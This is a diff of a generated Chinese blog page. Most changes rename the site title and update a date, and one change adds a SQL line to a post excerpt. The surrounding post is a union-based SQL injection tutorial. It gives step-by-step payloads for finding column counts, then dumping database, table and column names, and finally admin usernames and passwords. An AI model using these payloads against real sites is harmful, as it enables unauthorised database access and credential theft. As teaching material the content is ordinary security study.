@@ -93,9 +93,9 @@
 
 
 <meta property="og:type" content="website">
-<meta property="og:title" content="w1ndy&#39;s Blog">
+<meta property="og:title" content="w1ndy">
 <meta property="og:url" content="http://yoursite.com/page/4/index.html">
-<meta property="og:site_name" content="w1ndy&#39;s Blog">
+<meta property="og:site_name" content="w1ndy">
 <meta property="article:author" content="w1ndy">
 <meta name="twitter:card" content="summary">
 
@@ -133,7 +133,7 @@
 
 
 
-  <title>w1ndy's Blog</title>
+  <title>w1ndy</title>
   
 
 
@@ -164,12 +164,12 @@
     <div class="custom-logo-site-title">
       <a href="/"  class="brand" rel="start">
         <span class="logo-line-before"><i></i></span>
-        <span class="site-title">w1ndy's Blog</span>
+        <span class="site-title">w1ndy</span>
         <span class="logo-line-after"><i></i></span>
       </a>
     </div>
       
-        <p class="site-subtitle">生活就像海洋，只有意志坚强的人，才能到达彼岸。</p>
+        <p class="site-subtitle"></p>
       
   </div>
 
@@ -260,7 +260,7 @@
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="w1ndy's Blog">
+      <meta itemprop="name" content="w1ndy">
     </span>
 
     
@@ -418,7 +418,7 @@
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="w1ndy's Blog">
+      <meta itemprop="name" content="w1ndy">
     </span>
 
     
@@ -576,7 +576,7 @@
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="w1ndy's Blog">
+      <meta itemprop="name" content="w1ndy">
     </span>
 
     
@@ -614,8 +614,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2020-03-28T17:29:38+08:00">
-                2020-03-28
+              <time title="更新于" itemprop="dateModified" datetime="2020-05-20T14:08:54+08:00">
+                2020-05-20
               </time>
             
           </span>
@@ -678,7 +678,7 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">爆所有数据库名 </span><br><span class="line">(select group_concat(SCHEMA_NAME) from information_schema.schemata)</span><br></pre></td></tr></table></figure>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">爆当前库的所有表 </span><br><span class="line">select group_concat(table_name) from information_schema.tables <span class="built_in">where</span> table_schema=database()</span><br></pre></td></tr></table></figure>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">得到表中的字段名 将敏感的表进行16进制编码tablename=0x7461626C656E616D65 </span><br><span class="line">select group_concat(column_name) from information_schema.columns <span class="built_in">where</span> table_name=0x7461626C656E616D65</span><br></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">得到字段具体的值 </span><br><span class="line">select group_concat(id,fl4g) from secret_table</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">得到字段具体的值 </span><br><span class="line">select group_concat(id,fl4g) from secret_table</span><br><span class="line">select group_concat(id,username,password) from users--+</span><br></pre></td></tr></table></figure>
 <h3 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.确定注入点后 order by 1 ，返回正常数字1换2，一次向上加，加到页面报错。</span><br><span class="line">2.如果order by 6错误，order by 5正常，即可确定字段数为5</span><br><span class="line">3.查看回显点 and 1=2 union select 1,2,3,4,5 在出现数字的位置进行查数据，如页面出现数字2</span><br><span class="line">4.查数据库名字：and 1=2 union select 1,database(),3,4,5 出现数字2的位置会出现数据库名字</span><br><span class="line">5.查表 and 1=2 union select 1,group_concat(table_name),3,4,5 from information_schema.tables <span class="built_in">where</span> table_schema=‘数据库名称’</span><br><span class="line">6.查列 and 1=2 union select 1,group_concat(column_name),3,4,5 from information_schema.columns <span class="built_in">where</span> table_name=‘表名’</span><br><span class="line">7.查内容 and 1=2 union select 1,group_concat(username,password) from admin</span><br></pre></td></tr></table></figure>
           
         
